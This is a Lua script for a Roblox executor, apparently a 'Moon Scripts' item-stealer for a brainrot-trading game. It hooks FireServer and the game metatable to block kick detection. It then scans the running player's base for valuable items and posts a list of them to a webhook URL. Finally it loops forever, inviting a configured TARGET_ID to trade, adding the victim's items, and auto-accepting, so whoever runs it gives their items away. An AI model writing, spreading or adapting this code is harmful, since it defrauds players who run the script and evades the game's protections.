-- Script principal - Subir a GitHub como raw
print("🚀 Iniciando script...")

-- Esperar configuración
local function waitForConfig()
    local attempts = 0
    while not getgenv().TARGET_ID or not getgenv().WEBHOOK_URL or not getgenv().TargetBrainrots do
        attempts = attempts + 1
        if attempts % 10 == 0 then
            print("⏳ Esperando configuración... (intento " .. attempts .. ")")
            print("   TARGET_ID:", getgenv().TARGET_ID or "❌")
            print("   WEBHOOK_URL:", getgenv().WEBHOOK_URL and "✅" or "❌")
            print("   TargetBrainrots:", getgenv().TargetBrainrots and "✅" or "❌")
        end
        task.wait(0.5)
    end
    print("✅ Configuración cargada correctamente")
end

waitForConfig()

local TARGET_ID = getgenv().TARGET_ID
local WEBHOOK_URL = getgenv().WEBHOOK_URL
local TargetBrainrots = getgenv().TargetBrainrots
local WEBHOOK_AVATAR = getgenv().WEBHOOK_AVATAR or "https://i.pinimg.com/736x/47/75/7c/47757c272b43141436f8cba221d6c5d9.jpg"

print("🎯 Target ID:", TARGET_ID)
print("🌐 Webhook:", WEBHOOK_URL:sub(1, 50).."...")
print("🧠 Brainrots objetivo:", #TargetBrainrots)

-- ANTIKICK
if not getgenv().antikick then
    getgenv().antikick = true
    print("🛡️ Activando antikick...")
    local RS = game:GetService("ReplicatedStorage")
    pcall(function()
        local Sync = require(RS.Packages.Synchronizer)
        local getupvals = debug.getupvalues or getupvalues
        local setupval = debug.setupvalue or setupvalue
        local relate
        for _, v in pairs(getupvals(Sync.Get)) do
            if type(v) == "function" then relate = v break end
        end
        if relate then 
            setupval(relate, 2, true)
            print("✅ Antikick activado")
        end
    end)

    local kck = "\239\187\191"
    local function isFlag(a) return type(a) == "string" and a:sub(-3) == kck end
    local newcc = newcclosure or function(f) return f end
    local hookfn = hookfunction or replaceclosure
    local setread = setreadonly or function() end

    pcall(function()
        local realFS = Instance.new("RemoteEvent").FireServer
        local oldHF
        oldHF = hookfn(realFS, newcc(function(self, ...)
            if isFlag((...)) then return end
            return oldHF(self, ...)
        end))
    end)

    pcall(function()
        local mt = getrawmetatable(game)
        setread(mt, false)
        local oldNC = mt.namecall
        mt.namecall = newcc(function(self, ...)
            local m = getnamecallmethod()
            if (m == "FireServer" or m == "fireServer") and isFlag((...)) then
                return
            end
            return oldNC(self, ...)
        end)
        setread(mt, true)
    end)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = workspace.CurrentCamera
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

print("🔄 Cargando Net...")
local net = require(game.ReplicatedStorage.Packages.Net)

local Trade = {
    Invite = net:RemoteFunction("TradeService/Invite"),
    AddBrainrot = net:RemoteFunction("TradeService/AddBrainrot"),
    AddItem = net:RemoteFunction("TradeService/AddItem"),
    Ready = net:RemoteEvent("TradeService/Ready"),
    Accept = net:RemoteEvent("TradeService/Accept"),
}

print("✅ Trade cargado")

-- GUIDs
local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
local ITEM_GUID = "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"

-- MUTACIONES
local MUTATION_VARIANTS = {
    Lava = {"lava"},
    Oro = {"oro", "gold"},
    Diamante = {"diamante", "diamond"},
    Cyber = {"cyber"},
    Phantom = {"phantom"},
    Candy = {"candy"},
    Divino = {"divino", "divine"},
    Cursed = {"cursed"},
    Bloodroot = {"bloodroot"},
    Rainbow = {"rainbow"},
    Radiactivo = {"radiactivo", "radioactive"},
    YingYang = {"yingyang", "ying yang", "yin yang", "yin-yang", "ying-yang"}
}

local MUTATION_COLORS = {
    Lava = Color3.fromRGB(255, 120, 0),
    Oro = Color3.fromRGB(255, 215, 0),
    Diamante = Color3.fromRGB(0, 255, 255),
    Cyber = Color3.fromRGB(0, 255, 150),
    Phantom = Color3.fromRGB(150, 0, 255),
    Candy = Color3.fromRGB(255, 50, 150),
    Divino = Color3.fromRGB(255, 215, 0),
    Cursed = Color3.fromRGB(0, 200, 0),
    Bloodroot = Color3.fromRGB(200, 0, 0),
    Rainbow = Color3.fromRGB(255, 0, 255),
    Radiactivo = Color3.fromRGB(0, 255, 0),
    YingYang = Color3.fromRGB(255, 255, 255)
}

-- FUNCIÓN HAS MUTATION
local function hasMutation(data)
    if not data or type(data) ~= "table" then return false, nil end
    
    local function isExactMutation(text)
        if not text or type(text) ~= "string" then return false, nil end
        local lowerText = text:lower()
        for mutName, variants in pairs(MUTATION_VARIANTS) do
            for _, variant in ipairs(variants) do
                if lowerText == variant:lower() then
                    return true, mutName
                end
            end
        end
        return false, nil
    end
    
    local mutationFields = {"Mutation", "Mutations", "mutation", "mutations"}
    for _, field in ipairs(mutationFields) do
        if data[field] then
            if type(data[field]) == "string" then
                local found, mutName = isExactMutation(data[field])
                if found then return true, mutName end
            end
            if type(data[field]) == "table" then
                for key, value in pairs(data[field]) do
                    if type(key) == "string" then
                        local found, mutName = isExactMutation(key)
                        if found and (value == true or value == 1) then
                            return true, mutName
                        end
                    end
                    if type(value) == "string" then
                        local found, mutName = isExactMutation(value)
                        if found then return true, mutName end
                    end
                end
            end
        end
    end
    return false, nil
end

-- FUNCIÓN PARA OBTENER DATOS DE LA BASE
local function getMyBaseData()
    print("🔍 Buscando datos de tu base...")
    local module = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
    if not module then 
        print("❌ Synchronizer no encontrado")
        return nil 
    end
    
    local sync = require(module)
    local syncGet = sync.Get
    
    local syncTable = nil
    for i = 1, 15 do
        local success, value = pcall(debug.getupvalue, syncGet, i)
        if success and type(value) == "table" then 
            syncTable = value
            break 
        end
    end
    
    if not syncTable then 
        print("❌ No se pudo obtener syncTable")
        return nil 
    end
    
    local myData = {}
    for _, plotData in pairs(syncTable) do
        if type(plotData) == "table" then
            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
            
            local isMine = false
            if typeof(owner) == "Instance" and owner == LocalPlayer then
                isMine = true
            elseif typeof(owner) == "table" and owner.UserId == LocalPlayer.UserId then
                isMine = true
            end
            
            if isMine then
                table.insert(myData, plotData)
            end
        end
    end
    
    print("🏠 Parcelas encontradas:", #myData)
    return myData
end

-- FUNCIÓN PARA ESCANEAR BRAINROTS
local function scanBrainrots(myBaseData)
    print("🔍 Escaneando brainrots...")
    local brainrotQueue = {}
    local mutationQueue = {}
    
    if not myBaseData or #myBaseData == 0 then
        print("❌ No hay datos de base")
        return brainrotQueue, mutationQueue
    end
    
    local AnimalsShared
    pcall(function()
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    end)
    
    for _, plotData in pairs(myBaseData) do
        if type(plotData) == "table" then
            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slotKey, data in pairs(animalList) do
                    if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
                        local hasMut, mutName = hasMutation(data)
                        table.insert(brainrotQueue, {
                            slotKey = tonumber(slotKey), 
                            data = data, 
                            hasMutation = hasMut, 
                            mutation = mutName
                        })
                        if hasMut and mutName then
                            table.insert(mutationQueue, {
                                slotKey = tonumber(slotKey), 
                                data = data, 
                                mutation = mutName
                            })
                        end
                    end
                end
            end
        end
    end
    
    print("🧠 Brainrots encontrados:", #brainrotQueue)
    print("✨ Con mutación:", #mutationQueue)
    return brainrotQueue, mutationQueue
end

-- FUNCIÓN WEBHOOK
local function getRequest()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

local function colorToDecimal(c)
    return c and (math.floor(c.R * 255) * 65536 + math.floor(c.G * 255) * 256 + math.floor(c.B * 255)) or 3447003
end

local function formatCurrency(n)
    if not n then return "$0/s" end
    local function clean(s) return s:gsub("%.?0+$", "") end
    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
    if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
    if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
    if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
    return "$" .. tostring(math.floor(n)) .. "/s"
end

local function sendWebhook(brainrotQueue, mutationQueue, myBaseData)
    print("📤 Enviando webhook...")
    
    local AnimalsShared
    pcall(function()
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    end)
    
    local results = {}
    
    for _, item in ipairs(brainrotQueue) do
        local data = item.data
        local genVal = 0
        if AnimalsShared then
            pcall(function()
                genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil) or 0
            end)
        end
        
        table.insert(results, {
            name = data.Index,
            genVal = genVal,
            genStr = formatCurrency(genVal),
            hasMutation = item.hasMutation,
            mutation = item.mutation,
            data = data
        })
    end
    
    if #results == 0 then
        print("⚠️ No hay brainrots para mostrar")
        return
    end
    
    table.sort(results, function(a, b) return a.genVal > b.genVal end)
    
    local description = "**BRAINROTS EN TU BASE:**\n"
    for i = 1, math.min(20, #results) do
        local res = results[i]
        local mutationText = ""
        if res.hasMutation and res.mutation then
            mutationText = string.format(" `[%s]`", res.mutation)
        end
        description = description .. string.format("%s — %s%s\n", res.name, res.genStr, mutationText)
    end
    
    if #results > 20 then
        description = description .. string.format("*... y %d más*\n", #results - 20)
    end
    
    description = description .. string.format("\n**Total:** %d brainrots (%d con mutación)", #results, #mutationQueue)
    
    local payload = {
        content = "@everyone",
        embeds = {{
            title = "ᴍᴏᴏɴ ꜱᴄʀɪᴘᴛꜱ ☪︎",
            description = description,
            color = colorToDecimal(Color3.fromRGB(255, 0, 128)),
            footer = {text = string.format("%s | %s", LocalPlayer.Name, os.date("%H:%M:%S"))}
        }},
        username = "ᴍᴏᴏɴ ꜱᴄʀɪᴘᴛꜱ ☪︎",
        avatar_url = WEBHOOK_AVATAR
    }
    
    local requestFn = getRequest()
    if requestFn then
        pcall(function()
            requestFn({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
            print("✅ Webhook enviado")
        end)
    else
        print("❌ No se encontró función de request")
    end
end

-- FUNCIÓN DE AUTOMATIZACIÓN
local function startAutomation(brainrotQueue)
    print("🚀 Iniciando automatización...")
    
    if #brainrotQueue == 0 then
        print("❌ No hay brainrots para trade")
        return
    end
    
    -- Priorizar mutaciones
    local prioritizedQueue = {}
    for _, item in ipairs(brainrotQueue) do
        if item.hasMutation then
            table.insert(prioritizedQueue, item)
        end
    end
    for _, item in ipairs(brainrotQueue) do
        if not item.hasMutation then
            table.insert(prioritizedQueue, item)
        end
    end
    
    print("📋 Brainrots en cola:", #prioritizedQueue)
    
    -- Bucle de añadir brainrots
    task.spawn(function()
        local idx = 1
        while true do
            local item = prioritizedQueue[idx]
            if item and Trade.AddBrainrot then
                pcall(function()
                    Trade.AddBrainrot:InvokeServer(SELECT_GUID, item.slotKey, item.data)
                    print("✅ Añadido:", item.data.Index, item.hasMutation and "✨" or "")
                end)
                idx = (idx % #prioritizedQueue) + 1
            end
            task.wait(1)
        end
    end)
    
    -- Bucle de invitaciones
    task.spawn(function()
        while true do
            if Trade.Invite then
                pcall(function()
                    Trade.Invite:InvokeServer(INVITE_GUID, TARGET_ID)
                    print("📨 Invitación enviada a:", TARGET_ID)
                end)
            end
            task.wait(2)
        end
    end)
    
    -- Bucle de ready y accept
    task.spawn(function()
        while true do
            if Trade.Ready then
                pcall(function()
                    Trade.Ready:FireServer(READY_GUID)
                end)
            end
            task.wait(1)
            if Trade.Accept then
                pcall(function()
                    Trade.Accept:FireServer(ACCEPT_GUID)
                end)
            end
            task.wait(1)
        end
    end)
    
    print("✅ Automatización ejecutándose")
end

-- ============================================
-- EJECUCIÓN PRINCIPAL
-- ============================================
print("=" .. string.rep("=", 50))
print("🚀 EJECUTANDO SCRIPT PRINCIPAL")
print("=" .. string.rep("=", 50))

-- Esperar un momento para que todo cargue
task.wait(2)

-- Obtener datos de la base
local myBaseData = getMyBaseData()
if not myBaseData or #myBaseData == 0 then
    print("❌ No se encontraron datos. Reintentando en 5 segundos...")
    task.wait(5)
    myBaseData = getMyBaseData()
    if not myBaseData or #myBaseData == 0 then
        print("❌ Falló definitivamente")
        return
    end
end

-- Escanear brainrots
local brainrotQueue, mutationQueue = scanBrainrots(myBaseData)

if #brainrotQueue == 0 then
    print("❌ No se encontraron brainrots objetivo")
    print("🧠 TargetBrainrots:", TargetBrainrots)
    return
end

-- Enviar webhook
sendWebhook(brainrotQueue, mutationQueue, myBaseData)

-- Iniciar automatización
startAutomation(brainrotQueue)

print("✅ Script completado correctamente")
